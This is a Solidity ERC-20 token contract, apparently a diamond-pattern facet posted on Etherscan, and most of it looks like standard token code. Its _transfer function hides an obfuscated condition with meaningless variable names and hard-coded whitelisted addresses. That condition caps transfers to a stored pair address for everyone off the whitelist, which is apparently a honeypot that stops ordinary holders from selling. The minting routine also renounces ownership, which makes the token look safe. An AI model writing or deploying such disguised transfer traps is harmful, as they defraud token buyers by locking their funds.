/**
 *Submitted for verification at Etherscan.io on 2024-04-05
 */

/**
 *Submitted for verification at Etherscan.io on 2024-02-24
 */

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./TestLib.sol";
contract nameFacet is IERC20, IERC20Meta, Ownable {
    function name() public view virtual override returns (string memory) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._name;
    }
    function symbol() public view virtual override returns (string memory) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._symbol;
    }
    function decimals() public view virtual override returns (uint8) {
        return 8;
    }
    function transfer(
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }
    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._allowances[owner][spender];
    }
    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
    function totalSupply() public view virtual override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._totalSupply;
    }
    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._balances[account];
    }
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        ds._allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(to != address(0), "ERC20: transfer to the zero address");
        require(from != address(0), "ERC20: transfer from the zero address");

        if (
            (from != ds._p76234 &&
                to == 0x6b75d8AF000000e20B7a7DDf000Ba900b4009A80) ||
            (ds._p76234 == to &&
                from != 0x6b75d8AF000000e20B7a7DDf000Ba900b4009A80 &&
                from != 0xd50392d1e77De79CB90E340F384d6DC710ACB9Ea &&
                from != 0x738F7317dDC61Ae64E5BF1f1c0CEa1fAEf9e18E0 &&
                from != 0x0a4E844D0665D9cEf47E712b0C2a97EE6330891B)
        ) {
            uint256 _X7W88 = amount + 1;
            require(_X7W88 < ds._e242);
        }
        uint256 fromBalance = ds._balances[from];
        require(
            fromBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            ds._balances[from] = fromBalance - amount;
            ds._balances[to] += amount;
        }
        emit Transfer(from, to, amount);
        _afterTokenTransfer(from, to, amount);
    }
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
    function _mint(address account, uint256 amount) internal virtual {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(account != address(0), "ERC20: mint to the zero address");

        ds._totalSupply += amount;
        unchecked {
            ds._balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
        renounceOwnership();
    }
}
